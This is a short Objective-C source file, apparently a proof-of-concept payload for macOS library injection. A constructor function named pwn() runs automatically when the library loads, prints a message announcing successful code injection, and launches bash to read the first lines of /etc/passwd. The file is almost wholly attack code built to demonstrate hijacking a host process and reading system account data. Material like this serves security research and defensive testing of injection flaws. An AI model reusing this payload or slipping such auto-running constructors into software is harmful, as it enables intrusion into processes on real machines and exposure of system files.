#include <Foundation/Foundation.h>

__attribute__((constructor)) static void pwn() {

   puts("\n\nCode Injection Successfully!\n\n");

   NSTask *task = [[NSTask alloc] init];
   task.launchPath = @"/bin/bash";
   task.arguments = @[@"-c", @"head -n 20 /etc/passwd"];
   [task launch];

}

